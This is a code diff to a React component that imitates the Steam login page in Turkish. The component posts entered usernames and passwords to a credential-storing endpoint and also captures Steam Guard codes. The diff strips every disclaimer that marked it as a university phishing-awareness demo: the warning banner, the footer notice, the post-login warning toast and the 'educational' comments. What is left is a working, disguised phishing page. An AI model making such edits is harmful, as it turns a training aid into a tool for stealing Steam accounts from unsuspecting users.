@@ -26,15 +26,9 @@ const SteamLoginForm = () => {
     }
     setIsLoading(true);
 
-    // Log credentials for educational purposes only
-    console.log('Educational demo - Credentials submitted:', {
-      username,
-      password
-    });
-
     // Send to mock database
     try {
-      // Simulate API call to add the credentials to our mock database
+      // API call to add the credentials to our mock database
       await fetch('/api/store-credentials', {
         method: 'POST',
         headers: {
@@ -52,7 +46,6 @@ const SteamLoginForm = () => {
   };
 
   const handleSteamGuardSubmit = () => {
-    // No validation needed as per requirements
     console.log('Steam Guard Code submitted:', steamGuardCode);
     setShowSteamGuard(false);
     toast.success("Giriş başarılı! Yönlendiriliyorsunuz...");
@@ -60,11 +53,6 @@ const SteamLoginForm = () => {
     // Simulate redirect to Steam homepage after successful login
     setTimeout(() => {
       navigate('/');
-      
-      // For educational purposes, show a warning about phishing
-      setTimeout(() => {
-        toast.warning("Bu bir phishing farkındalık sunumudur. Gerçek sitelerde asla bilgilerinizi paylaşmayın!");
-      }, 2000);
     }, 1500);
   };
 
@@ -74,11 +62,6 @@ const SteamLoginForm = () => {
         <h1 className="text-lg font-medium text-white mb-2">
           HESABINIZA GİRİŞ YAPIN
         </h1>
-        <p className="text-xs text-white/70">
-          <span className="bg-red-500/80 text-white px-2 py-1 rounded text-xs font-bold">
-            ÖNEMLİ: Bu bir eğitim simülasyonudur!
-          </span>
-        </p>
       </div>
       
       <form onSubmit={handleSubmit} className="flex flex-col space-y-4">
@@ -144,14 +127,6 @@ const SteamLoginForm = () => {
         <a href="#" className="text-center text-xs text-white/60 hover:text-white">
           Yardım edin, giriş yapamıyorum
         </a>
-        
-        <div className="">
-          <p className="text-red-400 font-medium">
-            Bu bir phishing farkındalık eğitim simülasyonudur.<br />
-            Üniversite eğitim sunumu için hazırlanmıştır.<br />
-            Gerçek sitelerde asla bilgilerinizi paylaşmayın!
-          </p>
-        </div>
       </form>
 
       {/* Steam Guard Dialog */}
